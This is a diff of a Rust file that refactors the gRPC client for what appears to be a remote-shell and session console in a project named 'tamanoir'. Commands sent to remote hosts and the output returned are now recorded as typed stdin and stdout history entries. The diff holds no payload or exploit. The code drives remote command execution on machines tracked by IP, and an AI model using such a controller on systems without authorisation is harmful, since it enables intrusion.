@@ -1,7 +1,4 @@
-use std::{
-    net::Ipv4Addr,
-    sync::{Arc, RwLock},
-};
+use std::net::Ipv4Addr;
 
 use tokio::sync::mpsc::{UnboundedReceiver, UnboundedSender};
 use tokio_stream::StreamExt;
@@ -9,7 +6,10 @@ use tonic::{transport::Channel, Request};
 
 use crate::{
     app::{AppResult, SessionsMap},
-    section::session::utils::init_keymaps,
+    section::{
+        session::utils::init_keymaps,
+        shell::{ShellCmd, ShellCmdHistory, ShellStdType},
+    },
     tamanoir_grpc::{
         remote_shell_client::RemoteShellClient, session_client::SessionClient, Empty,
         SessionResponse, ShellStd,
@@ -17,7 +17,7 @@ use crate::{
 };
 #[derive(Debug, Clone)]
 pub enum GrpcEvent {
-    ShellEvent(ShellStd),
+    ShellEvent(ShellCmd),
     SessionEvent(SessionResponse),
 }
 
@@ -53,10 +53,15 @@ impl RemoteShellServiceClient {
         Ok(Self { client, tx })
     }
     pub async fn send_cmd(&mut self, cmd: String) -> AppResult<()> {
-        let shell_msg = ShellStd { message: cmd };
-        let msg = Request::new(shell_msg.clone());
+        let shell_msg = ShellStd {
+            message: cmd.clone(),
+        };
+        let msg = Request::new(shell_msg);
         self.client.send_shell_std_in(msg).await?;
-        self.tx.send(GrpcEvent::ShellEvent(shell_msg))?;
+        self.tx.send(GrpcEvent::ShellEvent(ShellCmd {
+            std_type: ShellStdType::StdIn,
+            inner: cmd,
+        }))?;
         Ok(())
     }
 }
@@ -72,7 +77,10 @@ impl StreamReceiver for RemoteShellServiceClient {
             .await?
             .into_inner();
         while let Some(msg) = stream.next().await {
-            self.tx.send(GrpcEvent::ShellEvent(msg?))?;
+            self.tx.send(GrpcEvent::ShellEvent(ShellCmd {
+                inner: msg?.message,
+                std_type: ShellStdType::StdOut,
+            }))?;
         }
         Ok(())
     }
@@ -94,13 +102,13 @@ impl StreamReceiver for SessionServiceClient {
 
 pub async fn sync_grpc_events(
     rx: &mut UnboundedReceiver<GrpcEvent>,
-    sessions: Arc<RwLock<SessionsMap>>,
-    shell_std: Arc<RwLock<Vec<String>>>,
+    sessions: SessionsMap,
+    shell_std: ShellCmdHistory,
 ) -> anyhow::Result<()> {
     while let Some(event) = rx.recv().await {
         match event {
             GrpcEvent::ShellEvent(msg) => {
-                shell_std.write().unwrap().push(msg.message);
+                shell_std.write().unwrap().push(msg);
             }
             GrpcEvent::SessionEvent(msg) => {
                 sessions.write().unwrap().insert(msg.ip.clone(), msg);
